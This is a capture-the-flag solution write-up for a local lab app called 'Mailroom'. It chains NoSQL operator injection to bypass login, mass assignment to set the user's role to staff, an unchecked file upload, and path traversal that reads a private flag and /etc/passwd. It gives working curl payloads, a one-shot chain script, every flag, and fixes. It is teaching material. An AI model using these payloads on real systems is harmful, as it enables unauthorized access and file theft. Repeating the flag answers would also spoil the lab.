# 🚩 Mailroom — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full walkthrough of the whole chain below. Close this if you're still
> solving.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

This box is one path: **NoSQLi → Mass Assignment → Insecure Upload → Path Traversal**.
Keep one cookie jar across all four steps — the session you win in step 1 is what carries
the escalation from step 2.

```bash
BASE=http://localhost:8092
```

## Flag 1 — NoSQL injection / auth bypass (`FLAG{n0sql_0p3r4t0r_1nj3ct10n_byp4ss}`)

`/api/login` runs `users.find_one({"username": u, "password": p})` with `u`/`p` taken
verbatim from your JSON body. You have no password — so don't send one. Send a **query
operator object** instead of a string, so the match is "password is not empty" rather than
"password equals X":

```bash
curl -s -c jar -b jar -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' $BASE/api/login
# {"ok":true,"redirect":"/dashboard"}

curl -s -b jar $BASE/dashboard | grep -o 'FLAG{[^}]*}'
```

That logs you in as the first matching user (`alice`). To land on a **specific** account,
pin the username and inject only the password:

```bash
-d '{"username":"mailadmin","password":{"$regex":".*"}}'   # log in as the admin
```

`$ne`, `$gt`, `$regex`, `$in` all work — anything that makes the password clause true.
→ `FLAG{n0sql_0p3r4t0r_1nj3ct10n_byp4ss}`

**Why it works:** you're sending JSON, so you control the *type* of each value. The app
assumed strings and dropped an attacker-controlled object straight into the query.

## Flag 2 — Mass assignment / privilege escalation (`FLAG{m4ss_4ss1gnm3nt_s3lf_pr0m0t3d}`)

The profile form only sends `{"displayName": ...}`, and `/api/profile` does
`update_one({...}, {"$set": <your whole body>})`. Nothing restricts *which* fields you may
set — so add the one that controls authorization. Your user record has a `role`; the staff
area checks it.

```bash
curl -s -b jar -c jar -H 'Content-Type: application/json' \
  -d '{"displayName":"pwn","role":"staff"}' $BASE/api/profile
# {"ok":true,"role":"staff"}

curl -s -b jar $BASE/staff | grep -o 'FLAG{[^}]*}'
```

→ `FLAG{m4ss_4ss1gnm3nt_s3lf_pr0m0t3d}`  (`"role":"admin"` works too.)

**Why it works:** the endpoint trusts the client to send only "safe" fields. Mass
assignment is the gap between the UI's form and the model's schema.

## Flag 3 — Insecure upload, no content check (`FLAG{upl04d_n0_c0nt3nt_ch3ck_pwn3d}`)

The uploader UI says "images only (JPG/PNG)" — but that's a client-side label; the server
validates nothing. Upload bytes that are plainly **not** an image (no JPEG/PNG/GIF magic).
`curl` never runs the page's JS, so nothing stops you:

```bash
printf 'this is not an image at all\n' > notimage.txt
curl -s -b jar -F 'file=@notimage.txt' $BASE/api/upload
# {"ok":true,"name":"notimage.txt","flag":"FLAG{upl04d_n0_c0nt3nt_ch3ck_pwn3d}"}
```

→ `FLAG{upl04d_n0_c0nt3nt_ch3ck_pwn3d}` (a real image would return `"flag":null` — the flag
is only awarded because a non-image got through untouched).

Note the response also tells you the read-back route: `/attachments?name=<file>`. That's
your pivot into step 4.

## Flag 4 — Path traversal / arbitrary read (`FLAG{p4th_tr4v3rs4l_arb1tr4ry_r34d}`)

`/attachments?name=` builds the path as `"/app/uploads/" + name` with no normalisation, so
`name` can climb out of the upload folder. `flag4.txt` sits in the sibling directory
`/app/private/`:

```bash
curl -s -b jar "$BASE/attachments?name=../private/flag4.txt"
# FLAG{p4th_tr4v3rs4l_arb1tr4ry_r34d}
```

Same bug is a general **arbitrary file read** — anything the process can open:

```bash
curl -s -b jar "$BASE/attachments?name=../../etc/passwd" | head -1
# root:x:0:0:root:/root:/bin/bash
```

→ `FLAG{p4th_tr4v3rs4l_arb1tr4ry_r34d}`

**Why it works:** "serve a file by name" became "open whatever path the user spells out,"
and `../` is a legal part of a name when nobody cleans it.

---

### Full chain in one script

```bash
BASE=http://localhost:8092
curl -s -c jar -b jar -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' $BASE/api/login >/dev/null   # 1
curl -s -b jar $BASE/dashboard | grep -o 'FLAG{[^}]*}'
curl -s -b jar -c jar -H 'Content-Type: application/json' \
  -d '{"role":"staff"}' $BASE/api/profile >/dev/null                              # 2
curl -s -b jar $BASE/staff | grep -o 'FLAG{[^}]*}'
printf 'not-an-image' | curl -s -b jar -F 'file=@-;filename=x.txt' $BASE/api/upload \
  | grep -o 'FLAG{[^}]*}'                                                         # 3
curl -s -b jar "$BASE/attachments?name=../private/flag4.txt"                      # 4
```

### Full flag list
1. `FLAG{n0sql_0p3r4t0r_1nj3ct10n_byp4ss}` — send `{"$ne":""}` where a password string was expected
2. `FLAG{m4ss_4ss1gnm3nt_s3lf_pr0m0t3d}`   — add `"role":"staff"` to the profile patch
3. `FLAG{upl04d_n0_c0nt3nt_ch3ck_pwn3d}`   — upload a non-image; server never checks content
4. `FLAG{p4th_tr4v3rs4l_arb1tr4ry_r34d}`   — `?name=../private/flag4.txt` escapes the upload dir

### The fixes (one per link in the chain)
1. **NoSQLi:** coerce credential fields to `str()` before querying and reject non-string
   types; better, look up the user by username only, then verify a **hashed** password in
   application code — never let the client's value reach the query as an object.
2. **Mass assignment:** allow-list updatable fields (`{"displayName"}`) and build the
   `$set` from that list; never `$set` the raw request body. Authorization fields like
   `role` must only change through a separate, authorized flow.
3. **Insecure upload:** validate real content (magic bytes / image decode), store outside
   the web root under a server-generated name, and set a fixed content type on read-back.
4. **Path traversal:** resolve the final path (`os.path.realpath`) and confirm it's still
   inside the uploads directory before opening; reject any `name` containing `/` or `..`.

**Meta-lesson:** none of these four is exotic, but *chained* they take you from
"no account" to "read any file on the box." Defence in depth matters because attackers
don't stop at the first bug — they use each finding as a foothold for the next.
